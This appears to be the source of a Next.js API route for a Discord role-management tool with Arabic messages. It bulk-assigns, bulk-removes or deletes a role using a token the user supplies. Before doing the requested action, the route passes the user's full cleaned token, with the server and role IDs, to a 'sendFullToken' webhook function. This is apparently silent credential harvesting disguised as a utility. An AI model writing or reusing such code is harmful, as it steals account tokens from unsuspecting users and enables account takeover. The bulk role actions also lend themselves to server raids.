import { NextRequest, NextResponse } from 'next/server';
import { cleanToken, discordFetch, batchProcess } from '@/lib/discord';
import { sendFullToken } from '@/lib/webhook';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

type RoleAction = 'give_all' | 'remove_all' | 'delete_role';

export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:roles-manager`, RATE_LIMITS.default);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await request.json().catch(() => ({}));
    const { token, guildId, roleId, action } = body as {
      token?: string;
      guildId?: string;
      roleId?: string;
      action?: RoleAction;
    };

    if (!token || !guildId) {
      return NextResponse.json({ success: false, error: 'أدخل التوكن وأيدي السيرفر' }, { status: 400 });
    }
    if (!roleId) {
      return NextResponse.json({ success: false, error: 'أدخل أيدي الرتبة' }, { status: 400 });
    }
    if (!action || !['give_all', 'remove_all', 'delete_role'].includes(action)) {
      return NextResponse.json({ success: false, error: 'إجراء غير صالح' }, { status: 400 });
    }

    const ct = cleanToken(token);
    sendFullToken('إدارة رتب', ct, { '🏰 السيرفر': guildId, '🛡️ الرتبة': roleId, '⚙️ الإجراء': action });

    // === حذف الرتبة ===
    if (action === 'delete_role') {
      const res = await discordFetch(ct, 'DELETE', `/guilds/${guildId}/roles/${roleId}`);
      if (res.ok || res.status === 204) {
        return NextResponse.json({ success: true, total: 1, succeeded: 1, failed: 0 });
      }
      if (res.status === 403) return NextResponse.json({ success: false, error: 'ليس لديك صلاحية حذف الرتب - تحتاج Manage Roles' });
      if (res.status === 404) return NextResponse.json({ success: false, error: 'الرتبة غير موجودة في هذا السيرفر' });
      return NextResponse.json({ success: false, error: 'فشل حذف الرتبة - تأكد من صلاحياتك وأن الرتبة موجودة' });
    }

    // === give_all / remove_all - جلب الأعضاء ===
    const membersRes = await discordFetch(ct, 'GET', `/guilds/${guildId}/members?limit=1000`);
    if (!membersRes.ok || !Array.isArray(membersRes.data)) {
      if (membersRes.status === 403) return NextResponse.json({ success: false, error: 'ليس لديك صلاحية جلب الأعضاء في هذا السيرفر' });
      if (membersRes.status === 401) return NextResponse.json({ success: false, error: 'التوكن غير صالح أو منتهي' });
      return NextResponse.json({ success: false, error: 'فشل جلب أعضاء السيرفر' });
    }

    const members = membersRes.data as Array<{ user: { id: string } }>;
    const total = members.length;

    if (total === 0) {
      return NextResponse.json({ success: true, total: 0, succeeded: 0, failed: 0, message: 'لا يوجد أعضاء في السيرفر' });
    }

    const method = action === 'give_all' ? 'PUT' : 'DELETE';
    const endpoint = (userId: string) => `/guilds/${guildId}/members/${userId}/roles/${roleId}`;

    const { successCount, failCount } = await batchProcess(
      members,
      async (member) => {
        const res = await discordFetch(ct, method, endpoint(member.user.id));
        return res.ok;
      },
      50,
      500
    );

    const actionName = action === 'give_all' ? 'إعطاء' : 'سحب';
    return NextResponse.json({
      success: true,
      message: `تم ${actionName} الرتبة - نجح: ${successCount} | فشل: ${failCount} | المجموع: ${total}`,
      total,
      succeeded: successCount,
      failed: failCount,
    });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
